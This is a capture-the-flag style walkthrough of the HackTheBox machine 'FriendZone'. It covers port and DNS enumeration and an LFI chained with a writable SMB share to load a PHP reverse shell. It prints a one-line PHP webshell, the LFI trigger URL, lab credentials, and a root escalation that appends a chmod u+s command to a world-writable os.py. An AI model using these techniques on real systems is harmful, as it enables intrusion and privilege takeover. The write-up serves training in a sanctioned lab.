---
title: HTB [FriendZone]
date: 2023-02-17 01:28:05 +0200
categories: [linux,dns,lfi]
tags: [HACKTHEBOX MACHINES]
excerpt: Frienzone is an easy hackthebox machine that involves a bunch of rabbit holes. We need to chain lfi and writable smb share to get RCE, ann for root the os.py is world writable, we will write our system commands there to get code execution
---

![](https://i.imgur.com/WDu1jB5.png)

## RECON

### Port Scan

```js
PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 3.0.3
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4/mXYmkhp2syUwYpiTjyUAVgrXhoAJ3eEP/Ch7omJh1jPHn3RQOxqvy9w4M6mTbBezspBS+hu29tO2vZBubheKRKa/POdV5Nk+A+q3BzhYWPQA+A+XTpWs3biNgI/4pPAbNDvvts+1ti+sAv47wYdp7mQysDzzqtpWxjGMW7I1SiaZncoV9L+62i+SmYugwHM0RjPt0HHor32+ZDL0hed9p2ebczZYC54RzpnD0E/qO3EE2ZI4pc7jqf/bZypnJcAFpmHNYBUYzyd7l6fsEEmvJ5EZFatcr0xzFDHRjvGz/44pekQ40ximmRqMfHy1bs2j+e39NmsNSp6kAZmNIsx
|   256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOPI7HKY4YZ5NIzPESPIcP0tdhwt4NRep9aUbBKGmOheJuahFQmIcbGGrc+DZ5hTyGDrvlFzAZJ8coDDUKlHBjo=
|   256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF+FZS11nYcVyJgJiLrTYTIy3ia5QvE3+5898MfMtGQl
53/tcp  open  domain      syn-ack ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Friend Zone Escape software
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    syn-ack Apache httpd 2.4.29
| tls-alpn:
|_  http/1.1
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/localityName=AMMAN/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED
| Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/localityName=AMMAN/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-10-05T21:02:30
| Not valid after:  2018-11-04T21:02:30
| MD5:   c14418685e8b468dfc7d888b1123781c
| SHA-1: 88d2e8ee1c2cdbd3ea552e5ecdd4e94c4c8b9233
| -----BEGIN CERTIFICATE-----
| MIID+DCCAuCgAwIBAgIJAPRJYD8hBBg0MA0GCSqGSIb3DQEBCwUAMIGQMQswCQYD
| VQQGEwJKTzEQMA4GA1UECAwHQ09ERVJFRDEOMAwGA1UEBwwFQU1NQU4xEDAOBgNV
| BAoMB0NPREVSRUQxEDAOBgNVBAsMB0NPREVSRUQxFzAVBgNVBAMMDmZyaWVuZHpv
| bmUucmVkMSIwIAYJKoZIhvcNAQkBFhNoYWhhQGZyaWVuZHpvbmUucmVkMB4XDTE4
| MTAwNTIxMDIzMFoXDTE4MTEwNDIxMDIzMFowgZAxCzAJBgNVBAYTAkpPMRAwDgYD
| VQQIDAdDT0RFUkVEMQ4wDAYDVQQHDAVBTU1BTjEQMA4GA1UECgwHQ09ERVJFRDEQ
| MA4GA1UECwwHQ09ERVJFRDEXMBUGA1UEAwwOZnJpZW5kem9uZS5yZWQxIjAgBgkq
| hkiG9w0BCQEWE2hhaGFAZnJpZW5kem9uZS5yZWQwggEiMA0GCSqGSIb3DQEBAQUA
| A4IBDwAwggEKAoIBAQCjImsItIRhGNyMyYuyz4LWbiGSDRnzaXnHVAmZn1UeG1B8
| lStNJrR8/ZcASz+jLZ9qHG57k6U9tC53VulFS+8Msb0l38GCdDrUMmM3evwsmwrH
| 9jaB9G0SMGYiwyG1a5Y0EqhM8uEmR3dXtCPHnhnsXVfo3DbhhZ2SoYnyq/jOfBuH
| gBo6kdfXLlf8cjMpOje3dZ8grwWpUDXVUVyucuatyJam5x/w9PstbRelNJm1gVQh
| 7xqd2at/kW4g5IPZSUAufu4BShCJIupdgIq9Fddf26k81RQ11dgZihSfQa0HTm7Q
| ui3/jJDpFUumtCgrzlyaM5ilyZEj3db6WKHHlkCxAgMBAAGjUzBRMB0GA1UdDgQW
| BBSZnWAZH4SGp+K9nyjzV00UTI4zdjAfBgNVHSMEGDAWgBSZnWAZH4SGp+K9nyjz
| V00UTI4zdjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBV6vjj
| TZlc/bC+cZnlyAQaC7MytVpWPruQ+qlvJ0MMsYx/XXXzcmLj47Iv7EfQStf2TmoZ
| LxRng6lT3yQ6Mco7LnnQqZDyj4LM0SoWe07kesW1GeP9FPQ8EVqHMdsiuTLZryME
| K+/4nUpD5onCleQyjkA+dbBIs+Qj/KDCLRFdkQTX3Nv0PC9j+NYcBfhRMJ6VjPoF
| Kwuz/vON5PLdU7AvVC8/F9zCvZHbazskpy/quSJIWTpjzg7BVMAWMmAJ3KEdxCoG
| X7p52yPCqfYopYnucJpTq603Qdbgd3bq30gYPwF6nbHuh0mq8DUxD9nPEcL8q6XZ
| fv9s+GxKNvsBqDBX
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_http-title: 404 Not Found
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
|_clock-skew: mean: -39m57s, deviation: 1h09m16s, median: 1s
| smb2-time:
|   date: 2023-02-17T03:49:07
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 60332/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 56115/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 57961/udp): CLEAN (Failed to receive data)
|   Check 4 (port 37865/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   FRIENDZONE<00>       Flags: <unique><active>
|   FRIENDZONE<03>       Flags: <unique><active>
|   FRIENDZONE<20>       Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2023-02-17T05:49:08+02:00
```

<br>

- **Anonymous** login disabled in FTP
- Port 53 is opened, which is quite interesting, let's comback to this later

![](https://i.imgur.com/oNYGBbm.png)

- When we have a website running on port 80, seems like a static site

![](https://i.imgur.com/jhRTTgk.png)

- There's a endpoint `/wordpress/` but it doesn't have any wordpress pages, just a directory listing

### SMB Enumeration

![](https://i.imgur.com/dn6rYA9.png)

- We have **READ** permissions in `general` , and **READ, WRITE** in `Development`

![](https://i.imgur.com/SlXhQoW.png)

- Listing the share `general` reveals, there's a file named `creds.txt` inside it
- And we got some credentials for admin from it

![](https://i.imgur.com/LxCjXfG.png)

- Nothing in `Development`, but note that we have write access here

![](https://i.imgur.com/bWDT88O.png)

- Got a username `friend` from the enum4linux output
- Tried these credentials as `admin` & `friend` via **ftp** and **ssh** but it's incorrect

### Web Enumeration

- Nothing intersting in port 80, but we have port 443 also
- Reviewing nmap's output tells that it has `friendzone.red` as the common name and we got an email address `haha@friendzone.red`
- Visiting that page `https://10.10.10.123` returns **404 Not Found**, so add this to our `/etc/hosts`

![](https://i.imgur.com/b6emGOk.png)

- We have a gym boy who tries to escape from the **Friend Zone** lol

![](https://i.imgur.com/r8uaQuF.png)

- There are some interesting endpoints in feroxbuster output

![](https://i.imgur.com/GWR4erY.png)

- There's a comment in the page that refers `js/js` page has something related to development

![](https://i.imgur.com/jmo78kS.png)

- It just returns a base64 encoded text everytime, that's not even ascii
- And `/admin/` has a empty directory listing

## INITIAL FOOT HOLD

### DNS Enumeration

![](https://i.imgur.com/6Bcg7c6.png)

- We got a new subdomain called `admin.friendzone.htb`
- But that looks exactly like the previous http website
- Just now I've noticed there's another hostname called `friendzoneportal.red` , it's in the website

![](https://i.imgur.com/AzPgqv1.png)

- But nothing interesting here!!

![](https://i.imgur.com/hmQM2lJ.png)

- We got few extra subdomains while doing a zone transfer in `friendzone.htb`

![](https://i.imgur.com/mxHdBz8.png)

- Wait we have more XD

<br>

```js
administrator1.friendzone.red
hr.friendzone.red
uploads.friendzone.red
admin.friendzoneportal.red
files.friendzoneportal.red
imports.friendzoneportal.red
vpn.friendzoneportal.red
```

<br>

- Add these things to your `/etc/hosts` file
- Now create a `hosts.txt` file with these hosts
- Visting everything manually will take a lot of time, So I'm gonna use [httpx](https://github.com/projectdiscovery/httpx) from projectdiscovery

![](https://i.imgur.com/6IEuhjT.png)

- First let's look the Admin pages

![](https://i.imgur.com/zTYjyxu.png)

- Two login portals
- Let's try the creds that we got in smb share `admin:WORKWORKHhallelujah@#`

![](https://i.imgur.com/qjJrCZz.png)

- It works in both pages, but the first one suggesting us to visit the second page

![](https://i.imgur.com/5RD3XBc.png)

- Some parameters are missing, and we don't have any timestamps
- Earlier we got `https://uploads.friendzone.red/` page, visiting that page reveals we can upload files there

![](https://i.imgur.com/kuyH3Rf.png)

- So I've uploaded a `cutecat.jpg` and it returns a timestamp
- But that doesn't worked, my image is not displayed, `Something went worng ! , the script include wrong param !`
- There's an LFI in `pagename` parameter, by default it has `timestamp` that denotes they're appending `.php` to it
- So we can't directly read files like `/etc/passwd`
- So let's read the php files via php filters like base64-encode
- After reading few php files, nothing seems interesting, we can read files with the extensions of `.php`
- So if we upload some php files then we can read that via lfi and execute it
- It's located in `../uploads/upload.php`

```php
<?php
// not finished yet -- friendzone admin !
if(isset($_POST["image"])){
echo "Uploaded successfully !<br>";
echo time()+3600;
}else{
echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";
}
?>
```

- Turns out we are not even uploading her XD
- Everything was fake
- So let's enum that SMB again!!, there we have write access to `Development` share
- If we can find where they're storing those files, then we can upload a php rev shell there and access it via LFI

![](https://i.imgur.com/u4VWA0D.png)

- The comment says `Files` are stored in `/etc/files`
- So if that's true, then we can acccess the contents of `general` in `/etc/general` and `Development` in `/etc/Development/`
- There's a file named `creds.txt` in `general` share but it's not php so we can't access that via lfi
- Let's upload a php file in `Development` Share and test that for RCE

![](https://i.imgur.com/DfwKvjn.png)

- You're seeing the shortest possible webshell here **<?=`$_GET[1]`?>**
- Lol but they're appending `.php` to it so we can't execute commands in the parameters, I forgot :(
- Let's a direct revshell 

![](https://i.imgur.com/1JWwU6g.png)

- After uploading trigger the shell using LFI
- `https://administrator1.friendzone.red/dashboard.php?image_id=b.png&pagename=/etc/Development/php-reverse-shell`
- It appends `.php` to it, so it gets executed and we got shell!!
- Now you can submit the user.txt located in `/home/friend` folder

## PRIVESC

- We can get the creds for friend user in `/var/www/mysql_data.conf` file

<br>

```js
www-data@FriendZone:/var/www$ cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

<br>

![](https://i.imgur.com/FPAp9oD.png)

- Running pspy64 reveals there's a python script running as root

<br>

```py
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

<br>

- Just a print statement?!!
- We don't have write permissions for this file
- They're importing the os module and doing soem stuff with it, but that part was commented out
- So it just prints the first email address

![](https://i.imgur.com/F0g6Wri.png)

- Looking at these module files show us, `/usr/lib/python2.7/os.py` is writable by anyone
- They're using `python` to execute this script and it's the same `python2.7`
- And they're importing this os module, so if we write some code in this file, then it gets executed as root

```bash
echo "system('chmod u+s /bin/bash')" >> /usr/lib/python2.7/os.py
```

![](https://i.imgur.com/RpcDH6E.png)

- After few minutes our `/bin/bash` binary gets SUID bit, then we can root it with `bash -p` ezpz

